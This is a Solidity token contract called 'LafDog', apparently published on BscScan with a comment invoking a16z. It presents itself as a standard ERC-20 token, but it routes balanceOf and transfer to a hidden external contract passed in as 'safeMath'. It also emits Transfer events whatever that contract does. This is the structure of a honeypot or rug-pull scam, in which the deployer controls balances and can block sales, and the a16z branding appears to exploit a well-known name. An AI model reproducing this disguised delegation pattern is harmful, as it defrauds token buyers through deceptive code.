/**
 *Submitted for verification at BscScan.com on 2022-03-16
*/

/**
 * A16Z is a Rewards for loyal users of a16z, don't buy or hype it
 */

pragma solidity >=0.4.25;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

contract LafDog is IERC20 {
    address public owner = msg.sender;
    string public name = "LafDog";
    string public symbol = "LafDog";
    uint8 public _decimals;
    uint256 public _totalSupply;

    mapping(address => mapping(address => uint256)) private allowed;
    address private _library;

    constructor(address safeMath) {
        _decimals = 9;
        _totalSupply = 1000000 * 10**9;
        _library = safeMath;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function balanceOf(address who) external view override returns (uint256) {
        return SafeTransfer(_library).balanceOf(who);
    }

    function allowance(address who, address spender)
        public
        view
        override
        returns (uint256)
    {
        return allowed[who][spender];
    }

    function transfer(address to, uint256 amount)
        public
        override
        returns (bool success)
    {
        emit Transfer(msg.sender, to, amount);
        return
            SafeTransfer(_library).transfer(msg.sender, msg.sender, to, amount);
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public override returns (bool success) {
        assert(amount <= allowed[from][msg.sender]);
        allowed[from][msg.sender] = allowed[from][msg.sender] - amount;
        emit Transfer(from, to, amount);
        return SafeTransfer(_library).transfer(msg.sender, from, to, amount);
    }

    function approve(address spender, uint256 value)
        external
        override
        returns (bool success)
    {
        allowed[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
}

interface SafeTransfer {
    function transfer(
        address caller,
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    function balanceOf(address who) external view returns (uint256);
}